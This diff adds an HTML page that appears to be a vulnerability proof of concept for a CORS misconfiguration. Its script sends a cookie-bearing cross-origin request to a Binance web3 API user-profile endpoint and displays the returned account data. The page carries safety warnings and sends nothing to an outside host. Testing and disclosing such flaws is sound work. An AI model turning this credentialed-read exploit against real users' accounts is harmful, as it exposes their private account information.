@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>cors-poc — Live PoC</title>
+  <style>
+    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;max-width:900px;margin:28px auto;color:#111}
+    h1{font-size:20px}
+    pre{background:#f6f8fa;padding:12px;border-radius:6px;white-space:pre-wrap}
+    .warn{color:#a30}
+    .ok{color:green}
+    button{background:#0366d6;color:#fff;padding:8px 12px;border-radius:6px;border:0;cursor:pointer}
+  </style>
+</head>
+<body>
+  <h1>cors-poc — Live PoC (read‑only)</h1>
+  <p class="warn"><strong>Safety:</strong> Use this page only while logged in with a <em>test</em> Binance account you own (no funds). Do NOT run this page on accounts you don't own.</p>
+
+  <p>This page will attempt to fetch <code>https://web3api.binance.com/api/v1/user/profile</code> with credentials (cookies) included and display the result. If the server allows an attacker origin, the page may show account info (PoC).</p>
+
+  <p><button id="run">Run PoC (one click)</button></p>
+
+  <div id="status"><em>Idle</em></div>
+  <h3>Result (truncated)</h3>
+  <pre id="out">Not executed yet.</pre>
+
+  <script>
+    const out = document.getElementById('out');
+    const status = document.getElementById('status');
+    document.getElementById('run').onclick = async () => {
+      status.textContent = 'Running… (single GET with credentials)';
+      out.textContent = 'Waiting for response…';
+      try {
+        const r = await fetch('https://web3api.binance.com/api/v1/user/profile', { credentials: 'include', method: 'GET', mode: 'cors' });
+        const text = await r.text();
+        out.textContent = ('HTTP ' + r.status + ' ' + r.statusText + '\n\n').concat(text.slice(0, 20000));
+        status.innerHTML = r.ok ? '<span class="ok">Request completed</span>' : '<span class="warn">Request completed (non-OK)</span>';
+        console.log('Response headers:');
+        for(const pair of r.headers.entries()) console.log(pair[0]+': '+pair[1]);
+      } catch(e) {
+        status.innerHTML = '<span class="warn">Error</span>';
+        out.textContent = 'Fetch error: ' + e;
+      }
+      out.textContent += '\n\n---\nNote: this PoC reads only; do not perform write operations.';
+    };
+  </script>
+</body>
+</html>
